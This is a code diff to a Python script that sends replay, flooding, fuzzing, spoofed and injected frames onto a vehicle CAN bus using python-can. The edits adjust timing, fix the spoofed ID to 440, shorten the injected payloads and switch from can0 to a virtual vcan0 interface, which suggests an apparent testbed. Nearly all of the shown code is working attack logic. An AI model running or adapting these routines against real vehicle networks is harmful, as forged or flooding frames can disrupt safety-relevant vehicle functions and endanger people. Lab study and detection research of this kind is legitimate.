@@ -7,7 +7,7 @@ def replay_attack(bus, recorded_messages, duration):
     while time.time() - start < duration:
         for msg in recorded_messages:
             bus.send(msg)
-            time.sleep(0.01)
+            time.sleep(0.02)
 
 def dos_attack(bus, duration):
     msg = can.Message(arbitration_id=0x000, data=[0xEE]*1, is_extended_id=False)
@@ -15,6 +15,7 @@ def dos_attack(bus, duration):
     while time.time() - start < duration:
         try:
             bus.send(msg)
+            time.sleep(0.01)
             print("Sending dos message")
         except Exception as e:
             print(e)
@@ -36,27 +37,24 @@ def fuzzy_attack(bus, duration):
 
 def spoofing_attack(bus, duration):
     # Change ECU ID to a valid one from vehicle spy
-    spoofed_id = 0x123  
-    spoofed_data = [0x01, 0x02, 0x03, 0x04, 0xA5, 0xA5, 0xA5, 0xA5]
-
+    spoofed_id = 440
     start = time.time()
     while time.time() - start < duration:
-        spoofed_payload = random.choice(spoofed_data)
-        msg = can.Message(arbitration_id=random.randint(0x000, 0x7FF), data=[random.randint(0x00, 0xFF) for _ in range(1)], is_extended_id=False)
+        msg = can.Message(arbitration_id=spoofed_id, data=[random.randint(0x00, 0x01) for _ in range(1)], is_extended_id=False)
         bus.send(msg)
-        time.sleep(0.01)
+        time.sleep(0.02)
 
 def injection_attack(bus, duration):
     fake_commands = [
-        can.Message(arbitration_id=0x321, data=[0xAA, 0xBB, 0xCC, 0xDD, 0x00, 0x00, 0x00, 0x00], is_extended_id=False),
-        can.Message(arbitration_id=0x400, data=[0x10, 0x20, 0x30, 0x40, 0xFF, 0xFF, 0x00, 0x00], is_extended_id=False)
+        can.Message(arbitration_id=0x321, data=[0x00], is_extended_id=False),
+        can.Message(arbitration_id=0x400, data=[0x10], is_extended_id=False)
     ]
 
     start = time.time()
     while time.time() - start < duration:
         for msg in fake_commands:
             bus.send(msg)
-            time.sleep(0.01)
+            time.sleep(0.02)
 
 def capture_messages(bus, duration=2):
     captured = []
@@ -72,7 +70,7 @@ def main():
     BUSTYPE = 'can0'
 
     # bus = can.interface.Bus(channel=INTERFACE, bustype=BUSTYPE, receive_own_messages=True)
-    bus = can.ThreadSafeBus(interface='socketcan', channel='can0', receive_own_messages=True)
+    bus = can.ThreadSafeBus(interface='socketcan', channel='vcan0', receive_own_messages=True)
     recorded_messages = capture_messages(bus, duration=2)
 
     attacks = [
